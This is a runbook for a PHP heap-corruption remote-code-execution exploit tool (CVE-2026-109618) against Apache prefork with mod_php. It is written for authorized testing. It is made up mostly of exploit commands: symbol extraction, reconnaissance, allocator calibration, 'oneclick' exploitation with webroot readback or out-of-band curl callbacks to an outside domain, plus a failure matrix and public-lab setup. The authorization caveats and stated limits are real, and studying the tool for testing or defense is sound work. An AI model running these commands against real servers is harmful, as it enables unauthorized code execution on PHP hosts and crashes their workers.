# Real Authorized Target Runbook (CVE-2026-109618)

> Preconditions: **written authorization + access to the target's same-build `libphp.so`/image**.
> Without the same-build binary, this tool can at most reach `AFFECTED / NEEDS_CALIBRATION` and cannot claim RCE.
>
> This runbook only addresses "credible results + reproducible parameters"; it does not provide any capability to bypass WAFs, hide traffic, or mass-exploit targets.

---

## 0. Confirm four things first (stop if any is missing)

| # | What to confirm | How to confirm |
|---|---|---|
| 1 | Target PHP is in the affected range | `recon` is read-only; or the client provides the version directly |
| 2 | `post_max_size > memory_limit` | Only measured within the authorized window; `recon --deep` or `scan` |
| 3 | The entry script calls `session_start()` | `PHPSESSID` is present in the response, or code audit confirms it |
| 4 | Same-build `libphp.so` is available | `/usr/lib/apache2/modules/libphp.so` inside the image, or the distro package |

The runtime must also be **Apache prefork + mod_php**. nginx + php-fpm / Apache event are outside the current implementation's scope.

---

## 1. Extract symbols from the same build and generate a profile skeleton

```bash
# Option A: take it directly from the target image/container
python attack/p2s_ext.py symbols \
  --docker <container>:/usr/lib/apache2/modules/libphp.so \
  --out profiles/target-symbols.json

# Option B: you already have the .so file
python attack/p2s_ext.py symbols \
  --elf ./libphp-target.so \
  --out profiles/target-symbols.json
```

The output must contain:

```
zif_system    = 0x......
zval_ptr_dtor = 0x......
```

This profile has `calibrated=false`; `ht_size`/`htdata_offset` are still base values.
**Using it directly will be rejected by oneclick (exit 15) — this is intentional.**

---

## 2. Read-only reconnaissance (zero payload)

```bash
python attack/p2s_ext.py recon -u https://target.example/ --json
```

Check three things: `php_version`, whether there is a session cookie, and whether `verdict` is `NEEDS_CALIBRATION` / `RCE_LIKELY`.

> The first step of `scan` / `oneclick` sends an OOM payload (2–24MB), which will kill the worker.
> **Do not run `scan --safe` during the read-only phase**: `--safe` only skips heap corruption verification; the OOM probe is still sent.

---

## 3. Calibration (the key to whether exploitation succeeds)

`zif/dtor` are determined by symbols; the remaining three quantities must be calibrated against the target allocator:
`ht_size`, `htdata_offset`, `stage1_n`/`stage2_t` (these may differ between builds).

### 3.1 Prefer calibrating on a "staging/copy of the same image"

```bash
python attack/p2s_ext.py calibrate \
  -u https://staging.example/ \
  --profile profiles/target-symbols.json \
  --dir /out --local-dir ./out \
  --rounds 8 --tries 2 \
  --out profiles/target-cal.json
```

On success the output is:

```
[calibrate] hit ht_size=167 htdata=0x690d8; readback=uid=33(www-data) ...
HIT → profiles/target-cal.json
```

### 3.2 No writable directory: use an out-of-band callback

```bash
# The callback domain must be very short: with cap=14, curl a.co/c1 = 12B
python attack/p2s_ext.py calibrate \
  -u https://staging.example/ \
  --profile profiles/target-symbols.json \
  --collab a.co --ht-size 167 \
  --htdata-window 0x68000:0x6C000 --htdata-step 0x100 \
  --rounds 8
```

Notes:

- `curl https://...` / a long domain will definitely exceed 14B; you must use a **short domain + port 80**, or switch to the writable-directory channel.
- The callback must be within the authorized scope; you may not use a third-party relay unknown to the tested party.

### 3.3 When `stage1_n` / `stage2_t` are wrong

First try adding `--stage1-n` (e.g. 841 → 800/900), or sweep `--stage2-t` for the build.
There is no automatic scanner for these two quantities; on failure the tool stops at `Stage-1 leak failed` / `Stage-2 leak failed`,
and will not falsely report success.

---

## 4. Exploitation + forensics (trust content, not exit codes)

### 4.1 Writable webroot (recommended; no outbound network needed on the target)

```bash
python attack/p2s_ext.py oneclick \
  -u https://target.example/ \
  --profile profiles/target-cal.json \
  --http-read https://target.example/ \
  --rounds 8 --tries 2 --force \
  --outdir out
```

Success criteria (enforced in code):

- The HTTP readback content matches `uid=\d+`;
- and the readback content is not the soft 404 page for a "random nonexistent path";
- `oneclick_report.json` contains `rce: true` and `proof_body` contains `uid=`.

### 4.2 No writable directory: out-of-band callback

```bash
python attack/p2s_ext.py oneclick \
  -u https://target.example/ \
  --profile profiles/target-cal.json \
  --collab a.co --listen --listen-port 80 \
  --rounds 8 --force \
  --outdir out
```

Success criteria: the listener receives a request whose `path` contains the token and records the source IP.
**No callback received = no evidence**; do not substitute `exit 0`.

### 4.3 Container directory mount (only when the lab/client provides a mount)

```bash
python attack/p2s_ext.py oneclick \
  -u https://target.example/ \
  --profile profiles/target-cal.json \
  --dir /out --local-dir ./out \
  --rounds 8 --force --outdir out
```

---

## 5. Failure matrix (look it up; do not blindly add rounds)

| Stops at | Meaning | Next step |
|---|---|---|
| `Stage-1 leak failed` | Wrong version/build, mismatched `stage1_n`, or no OOM-able body | Re-check `post_max > memory`; adjust `--stage1-n`; confirm the sink |
| `Stage-2 leak failed` | Wrong `dtor_offset` (symbols took the wrong .so) | Re-run `symbols` and confirm the .so is exactly the target build |
| `Stage-3` all miss | Wrong `ht_size` / `htdata_offset` | Go back to step 3 and calibrate; do not directly apply the bookworm values |
| Readback 404 | Webroot not writable, cwd is not docroot, or the relative path landed wrong | Switch to `--collab`, or confirm an absolute writable directory |
| Readback is the site home page | Soft 404 | The tool already excludes it; if it still hits, check whether `proof_body` really contains `uid=` |
| `NEEDS_CALIBRATION` | Profile has symbols only, no calibration | Run step 3 |

---

## 6. What still cannot be done (structural limitations)

- **Not universal for arbitrary real websites**: offsets are per-build; a different image means starting over.
- **Not cross-MPM**: nginx + php-fpm and Apache event are not implemented.
- **Single command ≤ `ht_size-0x98-1`** (commonly 14B): cannot write a webshell, reverse shell, persist, move laterally, or clear logs.
- **Cannot probe `post_max_size` non-destructively**: can only measure OOM or infer.
- **Cannot hide**: OOM leaves `POST`, `zend_mm_heap corrupted`, and `SIGSEGV` in the target's access/error log.

---

## 7. Your own public lab: differences from localhost

If the lab is deployed by you on the public internet (not client production) and the goal is to validate the real network path, fix the variables below.

> There are no scope/authorization parameters now: for a public lab, just provide the URL.
> Still use it only against your own assets.

### 7.1 Fix the variables first (strongly recommended)

- **Single worker**: prefork `StartServers 1`, `MinSpareServers 1`, `MaxSpareServers 1`, `MaxRequestWorkers 1`.
  This makes the "worker where the leak happens" and the "worker where Stage-3 lands" deterministic, eliminating multi-worker interference.
- **Same build**: choose `php:8.4.26-apache`. In your table only this row is `RCE_READY`;
  `8.2.12` can only crash (README §25 marks it `KNOWN_NO_RCE`), and `8.2.35` is the patched version.
- **Configuration**: `post_max_size=64M`, `memory_limit=8M`, `session.upload_progress.enabled=1`.
- **Entry point**: a script that calls `session_start()`.
- **Readback**: writable webroot (`--http-read`), or mount `/out` on the host (the tool runs on the host).
- **Firewall**: allow only your egress IP. This is a genuinely exploitable PHP, and others will scan it during the window.

### 7.2 ASLR

- First run with the default (enabled): if Stage-1/2 print `chunk_base` / `libphp_base`, the leak primitive works under ASLR.
- If the leak succeeds but Stage-3 fully misses: first confirm a single worker; if it still fails, calibrate `htdata_offset`.
- Do not disable host ASLR just to reproduce the lab — that would mask problems in the real environment.

### 7.3 Network

| Scenario | Command essentials |
|---|---|
| Tool runs on a laptop | `--http-read https://range/`; `--timeout 120`; **access via domain name** (point the domain to the lab IP in the local hosts file) so Host/SNI are both correct |
| Tool runs on the VPS host | `--dir /out --local-dir /srv/lab/out`, most stable, unaffected by WAN upstream |
| Self-signed TLS | Add `--insecure` |
| Hitting by IP directly while the vhost only accepts a domain | Only `php2shell.py exploit` supports `--host-header range.example.com`; for `oneclick`/`scan` use the domain instead |
| Slow upstream | A 12MB body needs at least ~2Mbps to finish sending within 120s |

### 7.4 The most stable single command (tool on the host, `/out` already mounted)

```bash
python attack/p2s_ext.py oneclick \
  -u http://range.example.com:8090/ \
  --profile profiles/target-cal.json \
  --dir /out --local-dir /srv/lab/out \
  --rounds 8 --timeout 120 --force
```

Success criteria: `oneclick_report.json` contains `rce: true` and `proof_body` contains `uid=`.
The exit code alone does not count.

### 7.5 Extra risks of a public lab

- Someone else may hit the vulnerable window first; take it down or upgrade to 8.4.27 immediately after testing.
- Do not put real credentials/data in the lab; OOM crashes the worker and is observable behavior.
- If you are only validating the tool, prefer `http-read` + single worker + allow only your own IP, and do not turn it into a long-running online service.
